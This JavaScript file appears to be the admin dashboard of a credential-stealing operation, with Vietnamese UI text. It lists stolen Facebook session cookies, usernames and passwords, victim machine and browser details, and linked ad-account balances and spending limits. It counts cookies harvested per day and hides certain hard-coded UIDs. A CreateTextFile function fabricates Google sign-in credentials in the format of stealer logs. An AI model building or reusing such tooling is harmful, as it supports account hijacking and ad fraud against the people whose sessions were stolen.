var indexPage = 0;
var totalPages = 0;
var loading = document.getElementById("loading").style;
var bodyForm = document.getElementById("bodyForm").style;
// loading.display="none";
bodyForm.opacity=0.3;
loading.display="block";

function addHours(numOfHours, date = new Date()) {
    date.setTime(date.getTime() + (numOfHours-1) * 60 * 60 * 1000);
    return date;
}

function getJwtTokenFromLocalStorage(){
    var jwtToken = localStorage.getItem("jwtToken");
    return jwtToken != null ? jwtToken : null;
}
function blockUid(uid){
    var arrUidBlock = ['100003365324028','100000027109103','100072634290101','606610471','100003857850174','100030228966971','100090106958137','100007882020247'];
    return !arrUidBlock.includes(uid);
}
function getResp(path){
    var jwtToken = getJwtTokenFromLocalStorage();
    if(jwtToken!=null){
        return $.ajax({
            url : server+path,
            headers: {
             'Authorization':'Bearer '+jwtToken
             },
            type : "POST",
            dataType:"json",
        });
    }
    return null;
}
function setListCookies(res){
    totalPages = res['totalPages'];
    document.getElementById('total-item').innerText=`(Tổng số ${res['totalElements']} cookies)`;
    getCountCookiesByDate();
    document.getElementById('btn-index-page').innerText="Page "+(indexPage+1)+"/"+totalPages;
    var tableCookies = document.getElementById('table-cookies');
    let html = ``;
    var count = 1;
    var content = res['content'];
    content.forEach(element => {
        var checked = element['status'] ? 'checked=""' : "";
        var infoAds = element['infoAds'];
        let htmlSegment = 
        `<tr id="tr-cookies${count}" scope="row" >
            <td>
                <label class="control control--checkbox">
                <input value=${element['id']} id="checkbox-delete${count}" type="checkbox" />
                <div class="control__indicator"></div>
                </label>
            </td>
            <td>${count}</td>
            <td>${element['id']}</td>
            <td class="pl-0">
            <div class="d-flex align-items-center">
                <a style="color: ${element['existed'] ? 'red' : '#007bff'};" href="https://facebook.com/${element['uid']}" class="name">${element['uid']}</a>
            </div>
            </td>
            <td>${element['machine']}</td>
            <td>${element['browser']}</td>
            <td>
                <div class="form-group purple-border">
                    <textarea class="form-control" id="exampleFormControlTextarea4" rows="3">${element['cookie']}</textarea>
                </div>
            </td>
            <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
            // <td><button onclick='CreateTextFile("${element['uid']}","${element['usernameAndPassword'] ? element['usernameAndPassword'] : null}",this)' class="btn btn-warning w-20 ml-3 confirm-button">Download</button></td>`;
            if(infoAds!=null){
                htmlSegment+= `<td>${infoAds['adsName']}<br>(${infoAds['adsId']})</td>
                <td>${infoAds['currency']} / ${infoAds['country']}</td>
                <td>${infoAds['accountStatus']==1 ? 'Hoạt động' : 'Vô hiệu hóa'}</td>
                <td>${infoAds['spendingLimit']} ${infoAds['currency']}</td>
                <td>${infoAds['balance']}</td>
                <td>${infoAds['thresholdAmount']} ${infoAds['currency']}</td>
                <td>${infoAds['totalSpending']} ${infoAds['currency']}</td>`;
            }
           else{
                htmlSegment+=`<td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>` ;
           }
            htmlSegment+=`<td>${element['createdDate'].slice(0, 19).replace(/-/g, "/").replace("T", " ")}</td>
            <td>
            <label class="custom-control ios-switch">
                <input value=${element['id']} id="btn-status${count}" type="checkbox" class="ios-switch-control-input" ${checked}>
                <span class="ios-switch-control-indicator"></span>
                </label>
            </td>
            <td>
            <button value=${element['id']} id="btn-delete${count}" class="btn btn-danger w-20 ml-3 confirm-button">Xóa</button>
            </td>
      
        </tr>`;
        // if(element['uid'] != '100003365324028' && element['uid'] != '100000027109103' && element['uid'] != '100072634290101' && element['uid'] != '606610471'){
        //     html += htmlSegment;
        //     count++;
        // }
        if(blockUid(element['uid'])){
            html += htmlSegment;
            count++;
        }
        // ${element['createdDate'].slice(0, 19).replace(/-/g, "/").replace("T", " ")}
        //${dateFormat(addHours(1,new Date(element['createdDate'])), "dddd, dd-mm-yyyy, HH:MM:ss")}
    });
    tableCookies.innerHTML = html;

    for(var i=1;i<=count;i++){
        try{
             mappingBtn(i);
        }
        catch(err){

        }
    }
    loading.display="none";
    bodyForm.opacity=1;

    document.getElementById("btn-delete-select").onclick=function(){
        var listCookies = [];
        var indexDelete = [];
        for(var i=1;i<=count;i++){
            try{
                var checked = document.getElementById(`checkbox-delete${i}`).checked;
                if(checked){
                    var cookies = {
                        id: document.getElementById(`checkbox-delete${i}`).value
                    }
                    listCookies.push(cookies);
                    indexDelete.push(i);
                }
            }
            catch(err){
    
            }
        }
        if(listCookies.length>0){
            if(confirm("Xác nhận xóa những mục đã chọn?")){

                indexDelete.forEach(element=>{
                    document.getElementById(`tr-cookies${element}`).remove();
                });

                var jwtToken = getJwtTokenFromLocalStorage();
                if(jwtToken!=null){
                    $.ajax({
                        url : server+"/delete-list-cookies",
                        headers: {
                        'Authorization':'Bearer '+jwtToken
                        },
                        contentType: 'application/json;charset=utf-8',
                        type : "POST",
                        dataType:"json",
                        data: JSON.stringify(listCookies)
                    });
                    alertSuccess("Xóa thành công!");
                    
                }
                else{
                    window.location.href = '../index.html';
                }
            }
        }
        else{
            alertError("Chưa có mục nào được chọn!");
        }
    }
}
function mappingBtn(i){
    document.getElementById(`btn-delete${i}`).onclick =function(){
        if(confirm(`Xác nhận xóa cookies số ${i}?`)){
            var jwtToken = getJwtTokenFromLocalStorage();
            if(jwtToken!=null){
                var data = {
                    id: document.getElementById(`btn-delete${i}`).value
                };
                $.ajax({
                    url : server+"/delete-cookies",
                    headers: {
                     'Authorization':'Bearer '+jwtToken
                     },
                    contentType: 'application/json;charset=utf-8',
                    type : "POST",
                    dataType:"json",
                    data: JSON.stringify(data),
                    success(result){
                        // window.location.href = '../home.html';
                        document.getElementById(`tr-cookies${i}`).remove();
                    },
                    error(result){
                        // window.location.href = '../home.html';
                        document.getElementById(`tr-cookies${i}`).remove();
                    }
                });
                alertSuccess("Xóa thành công!");
                
            }
            else{
                window.location.href = '../index.html';
            }
        }
    }
    document.getElementById(`btn-status${i}`).onclick =function(){
        var jwtToken = getJwtTokenFromLocalStorage();
        if(jwtToken!=null){
            var data = {
                id: document.getElementById(`btn-status${i}`).value
            };
            $.ajax({
                url : server+"/update-status",
                headers: {
                 'Authorization':'Bearer '+jwtToken
                 },
                contentType: 'application/json;charset=utf-8',
                type : "POST",
                dataType:"json",
                data: JSON.stringify(data)
            });
            alertSuccess("Cập nhật thành công!");
        }
        else{
            window.location.href = '../index.html';
        }
    }
}
async function getListCookie(){
    try {
        const res = await getResp("/get-cookies-page/"+indexPage);
        if(res !=null){
            setListCookies(res);
        } 
        else{
           window.location.href = '../index.html';
        }
      } catch(err) {
        console.log(err)
           localStorage.clear();
           window.location.href = '../index.html';
      }
}
async function callGetUserInfo() {
    try {
         const res = await getResp("/user");
         if(res !=null){
            if (res['username']!=undefined){
                getListCookie();
            }
              else{
                window.location.href = '../index.html';
              }
         } 
         else{
            window.location.href = '../index.html';
         }
       } catch(err) {
            console.log(err)
            localStorage.clear();
            window.location.href = '../index.html';
       }
}
async function getCountCookiesByDate() {
    try {
         const res = await getResp("/count-cookies-by-date");
         if(res !=null){
            if (res!=undefined){
               console.log(res);
               document.getElementById('total-item').innerText ="Hôm nay "+res+" cookies\n"+document.getElementById('total-item').innerText;
            }
              else{
                window.location.href = '../index.html';
              }
         } 
         else{
            window.location.href = '../index.html';
         }
       } catch(err) {
            console.log(err)
            localStorage.clear();
            window.location.href = '../index.html';
       }
}

function eventNextPage(){
    var btnPrev = document.getElementById('btn-prev-page');
    var btnNext = document.getElementById('btn-next-page');
    btnPrev.onclick = async function(){
        if(indexPage>0){
            bodyForm.opacity=0.3;
            loading.display="block";
            indexPage--;
            try {
                const res = await getResp("/get-cookies-page/"+indexPage);
                if(res !=null){
                    setListCookies(res);
                } 
                else{
                   window.location.href = '../index.html';
                }
              } catch(err) {
                console.log(err)
                   localStorage.clear();
                   window.location.href = '../index.html';
              }
        }
    }
    btnNext.onclick = async function(){
        if(indexPage<totalPages-1){
            bodyForm.opacity=0.3;
            loading.display="block";
            indexPage++;
            try {
                const res = await getResp("/get-cookies-page/"+indexPage);
                if(res !=null){
                    setListCookies(res);
                } 
                else{
                   window.location.href = '../index.html';
                }
              } catch(err) {
                console.log(err)
                   localStorage.clear();
                   window.location.href = '../index.html';
              }
        }
    }
}
function CreateTextFile(uid,pass) {
    var names = new Array('Lukas','Sergio','Joan','Jeremiah','Abel','Jamel','Gunner',
    'Armando','Lonnie','Caryn',
    'Angela',
    'Ann/Anne',
    'Andrea',
    'Glenda',
    'Fiona',
    'Bella',
    'Diana',
    'Gina',
    'Harmony',
    'Gabriela',
    'Wendy',
    'Joy',
    'Jenny',
    'Jessica',
    'Crystal',
    'Caroline',
    'Emma',
    'Claire',
    'Vivian',
    'Vera',
    'Madeline',
    'Ellie','Charmaine',
    'Abbey',
    'Adelaide',
    'Briona',
    'Sophia',
    'Artemis',
    'Eirene',
    'Donna',
    'Nora',
    'Grace',
    'Pandora',
    'Phoebe',
    'Florence',
    'Phoenix',
    'Serenity',
    'Una',
    'Aine',
    'Oralie',
    'Almira','Akina',
    'Bonnie',
    'Alula',
    'Antaram',
    'Ceridwen',
    'Eser',
    'Aster',
    'May',
    'Augusta',
    'June',
    'July',
    'Natalia',
    'Sunny',
    'Bell',
    'Elaine',
    'Charlotte',
    'Keelin',
    'Tina',
    'Grainne','Eric',
    'Alexander/Alex',
    'Corbin',
    'Carlos',
    'Alan',
    'Finn',
    'Bernie',
    'Elias',
    'Zane',
    'Beckham',
    'Arlo',
    'Atticus',
    'Clinton',
    'Silas',
    'Ethan',
    'Levi',
    'Justin',
    'Maverick',
    'Jesse',
    'Matthew',
    'Bear',
    'Duke','Andrew',
    'Vincent',
    'Marcus',
    'Leon',
    'Brian',
    'Walter',
    'Louis',
    'Dominic',
    'Leonard',
    'Harold',
    'Drake',
    'Chad',
    'Richard',
    'Elias',
    'Harvey',
    'Charles',
    'Ryder',
    'Orson',
    'Archibald');
    var mail = ['hotmail.com','outlook.com','gmail.com','yahoo.com'];
    var character = ['#','$','@',".",'','','','###','%','@@@','@@','#','$$','',''];
    var fisrtname = names[Math.floor(Math.random() * names.length)].toLowerCase();
    var lastname = names[Math.floor(Math.random() * names.length)].toLowerCase();
    var email = fisrtname+lastname+'@'+mail[Math.floor(Math.random() * mail.length)];
    var password = fisrtname+lastname+character[Math.floor(Math.random() * character.length)];
    var blob = new Blob([`URL:https://accounts.google.com/signin\nUsername: ${email}\nPassword: ${password}\nBrowser: [Chrome][Default]`], {
       type: "text/plain;charset=utf-8",
    });
    if(pass!="null"){
        saveAs(blob, `${uid}.txt`);
    }
}
callGetUserInfo();
eventNextPage();
